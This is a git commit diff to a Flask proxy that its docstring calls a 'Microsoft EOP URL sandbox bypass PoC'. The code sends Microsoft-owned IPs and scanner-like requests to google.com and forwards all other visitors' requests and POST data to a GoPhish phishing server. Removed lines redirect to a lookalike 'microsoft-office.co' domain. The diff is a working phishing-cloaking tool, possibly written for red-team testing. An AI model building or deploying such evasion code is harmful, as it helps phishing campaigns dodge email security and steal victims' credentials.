8b6d2d36a4ff3339fa5b4a87e6f2f7ee7a3a7fed
a5ucanc <itaycheredman@gmail.com>
2024-05-16 15:31:37 +0300

    bugix

--- antirelay/antirelay/app.py
+++ antirelay/antirelay/app.py
@@ -3,8 +3,10 @@ Microsoft EOP URL sandbox bypass
 PoC proxy server using client classification
 Author: Nimrod (Nimi) Bickels
 """
-from flask import Flask, request, redirect
+from flask import Flask, request, redirect, Response
 from ipwhois import IPWhois
+import logging
+import requests
 
 def is_microsoft_ans(ip):
     res = IPWhois(ip).lookup_rdap(depth=1)
@@ -19,40 +21,33 @@ def crawler(fn):
     def wrapper(*args, **kwargs):
         client_ip = request.headers.get('X-Forwarded-For', '').split(',')[0] or request.remote_addr
         if is_microsoft_ans(client_ip) or not request.headers.get('Accept', ''):
+            logging.info(f"REDIRECTED")
             return redirect('https://google.com')
         return fn(*args, **kwargs)
     return wrapper
 
-app = Flask(_name_)
-
-# @app.route('/')
-# @crawler
-# def landing():
-#     rid = request.args.get('rid')
-#     if rid:
-#         return redirect(f"https://microsoft-office.co/?url={rid}")
-#     abort(404)
-
-# @app.route('/track')
-# @crawler
-# def tracker():
-#     rid = request.args.get('url')
-#     if rid:
-#         return redirect(f'https://microsoft-office.co/track?url={rid}')
-#     abort(404)
+app = Flask(__name__)
 
 @app.route('/', defaults={'path': ''}, methods=["GET", "POST"])
 @app.route('/<path>', methods=["GET", "POST"])
 @crawler
 def redirect_to_gophish(path):
-    res = requests.request(  # ref. https://stackoverflow.com/a/36601467/248616
+    query_string = request.args.to_dict()
+    data = None
+    if request.method == 'POST':
+        data = request.get_data()
+
+    
+    res = requests.request( 
         method          = request.method,
         url             = f"http://gophish:80/{path}",
+        params          = query_string,
         headers         = {k:v for k,v in request.headers if k.lower() != 'host'}, # exclude 'host' header
-        data            = request.get_data(),
+        data            = data,
         cookies         = request.cookies,
         allow_redirects = False,
     )
+    logging.info(f'FORWARD - "{request.method} {query_string} {data}" to gophish/{path} - {len(res.content)}')
     headers = [(k,v) for k,v in res.raw.headers.items()]
 
     response = Response(res.content, res.status_code, headers)
---
+++ antirelay/antirelay/gunicorn.conf.py
@@ -0,0 +1,7 @@
+import multiprocessing
+
+bind = "0.0.0.0:80"
+workers = multiprocessing.cpu_count() * 2 + 1
+access_log_format = '%({x-forwarded-for}i)s %(l)s %(l)s [%(t)s] "%(r)s" %(s)s %(b)s %(a)s'
+accesslog = "-"
+errorlog = "-"
